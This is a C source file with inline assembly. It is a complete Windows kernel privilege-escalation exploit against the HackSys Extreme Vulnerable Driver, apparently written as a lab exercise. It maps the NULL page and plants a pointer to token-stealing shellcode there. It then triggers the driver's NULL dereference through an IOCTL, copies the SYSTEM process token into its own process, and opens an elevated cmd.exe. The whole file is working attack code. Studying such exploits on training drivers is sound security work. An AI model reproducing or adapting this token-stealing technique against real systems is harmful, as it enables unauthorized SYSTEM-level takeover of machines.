#include <stdio.h>
#include <Windows.h>

#define KTHREAD_OFFSET	0x124
#define KPROCESS_OFFSET	0x050
#define FLINK_OFFSET	0x0b8
#define PID_OFFSET		0x0b4
#define TOKEN_OFFSET	0x0f8
#define SYSTEM_PID		0x004
#define BUFFER_SIZE		0x220
#define CHUNK_SIZE      0x1f8
#define SPRAY_COUNT		15000
#define IO_CODE			0x22202B

#define NT_SUCCESS(status) (status >= 0)

typedef NTSTATUS (*pNtAllocateVirtualMemory)(
	HANDLE    ProcessHandle,
	PVOID*	  BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
);

HANDLE hDevice = NULL;
HMODULE hNtdll = NULL;
pNtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;

void StealTokenShellcode()
{
	__asm
	{
		pushad

		mov eax, fs:[KTHREAD_OFFSET]
		mov eax, [eax + KPROCESS_OFFSET]
		mov ecx, eax

	find_sytem_pid:
		mov ecx, [ecx + FLINK_OFFSET]
		sub ecx, FLINK_OFFSET
		mov edx, [ecx + PID_OFFSET]
		cmp edx, SYSTEM_PID
		jnz find_sytem_pid

		mov edx, [ecx + TOKEN_OFFSET]
		mov [eax + TOKEN_OFFSET], edx

		popad
		add esp, 0xc
		ret
	}
}

void CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

void AllocateNullPage()
{
	hNtdll = LoadLibraryA("Ntdll.dll");
	if (!hNtdll)
	{
		printf("[-] Failed To Load The Ntdll.dll\n");
		printf("[-] Error Code: %d\n", GetLastError());
		exit(1);
	}

	NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	if (!NtAllocateVirtualMemory)
	{
		printf("[-] Failed To Get The NtAllocateVirtualMemory Address\n");
		printf("[-] Error Code: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] Get The NtAllocateVirtualMemory Address: 0x%x\n", (DWORD)NtAllocateVirtualMemory);
	
	PVOID BaseAddress = (PVOID)1;
	SIZE_T RegionSize = 0x1000;
	if (!NT_SUCCESS(NtAllocateVirtualMemory(\
		INVALID_HANDLE_VALUE, &BaseAddress, NULL,\
		&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
	{
		printf("[-] Failed To Call The NtAllocateVirtualMemory\n");
		printf("[-] Error Code: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] Success To Allocate Null Page\n");

	*(PDWORD)0x4 = (DWORD)StealTokenShellcode;
	printf("[+] Null Page Offset 0x4 Value: 0x%x\n", *(PDWORD)0x4);
	printf("[+] Shellcode Original Address: 0x%x\n", (DWORD)StealTokenShellcode);
}

int main()
{
	int buf[2] = { 0 };
	BOOL status = FALSE;
	DWORD length = 0;
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);
	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed To Open Driver\n");
		printf("[-] Error Code: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] Driver Handle: %d\n", (DWORD)hDevice);
	AllocateNullPage();
	status = DeviceIoControl(hDevice, IO_CODE, buf, sizeof(buf), NULL, 0, &length, NULL);
	if (!status)
	{
		printf("[-] Failed To Send Message\n");
		printf("[-] Error Code: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] Time To Get Shell\n");
	CreateCmd();
	CloseHandle(hDevice);
	return 0;
}